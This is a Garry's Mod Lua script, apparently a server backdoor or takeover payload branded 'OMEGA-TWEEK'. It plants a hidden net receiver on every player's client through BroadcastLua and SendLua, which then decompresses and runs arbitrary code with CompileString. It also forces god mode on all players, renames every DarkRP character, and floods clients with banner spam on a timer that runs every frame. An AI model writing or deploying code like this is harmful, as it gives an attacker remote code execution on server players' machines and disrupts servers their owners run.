print([=[

   __                 _         _         ___                 _ 
  / /  __ _ _ __ ___ | |__   __| | __ _  / _ \__ _ _ __   ___| |
 / /  / _` | '_ ` _ \| '_ \ / _` |/ _` |/ /_)/ _` | '_ \ / _ \ |
/ /__| (_| | | | | | | |_) | (_| | (_| / ___/ (_| | | | |  __/ |
\____/\__,_|_| |_| |_|_.__/ \__,_|\__,_\/    \__,_|_| |_|\___|_|
                                                                
¯\_(ツ)_/¯
]=])


for k, v in pairs( player.GetAll() ) do
    if ( v:Alive() ) then
     v:GodEnable()
    else
        v:Spawn()
        timer.Simple( 1.2, function()
            v:GodEnable()
        end)
    end
end


local function rdm_str(len)
    if !len or len <= 0 then return '' end
    return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end

local net_string = rdm_str(25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "☂️_PRIVATE_JOKE",function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
    end
end)

local function SendToClient(code)
    local data = util.Compress(code)
    local len = #data
    net.Start(net_string)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end
timer.Simple( 17, function()
    SendToClient([[
print([=[
 ██████╗ ███████╗████████╗    
██╔════╝ ██╔════╝╚══██╔══╝    
██║  ███╗█████╗     ██║       
██║   ██║██╔══╝     ██║       
╚██████╔╝███████╗   ██║       
 ╚═════╝ ╚══════╝   ╚═╝       
███╗   ██╗ ██████╗ ███████╗ ██████╗ ██████╗ ██████╗ ███████╗
████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝
██╔██╗ ██║██║   ██║███████╗██║     ██║   ██║██████╔╝█████╗  
██║╚██╗██║██║   ██║╚════██║██║     ██║   ██║██╔═══╝ ██╔══╝ 
██║ ╚████║╚██████╔╝███████║╚██████╗╚██████╔╝██║     ███████╗ 
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚══════╝
OMEGA-TWEEK
OMEGA-TWEEK
¯\_(ツ)_/¯
]=]])

    timer.Create( "🤫_RIP_U_VAC_BANNED", 1, 0, function()
        for k,v in pairs(player.GetAll()) do
            v:GodEnable()
            v:setDarkRPVar( "rpname", "OMEGA-TWEEK Control The World ;)" )
        end

    end )

end)


timer.Create( "🤤_SPAM", 0, 0, function()
    SendToClient([[print("OMEGA-TWEEK")]])
    print("GET NOSCOPE  !! BY OMEGA-TWEEK")
end)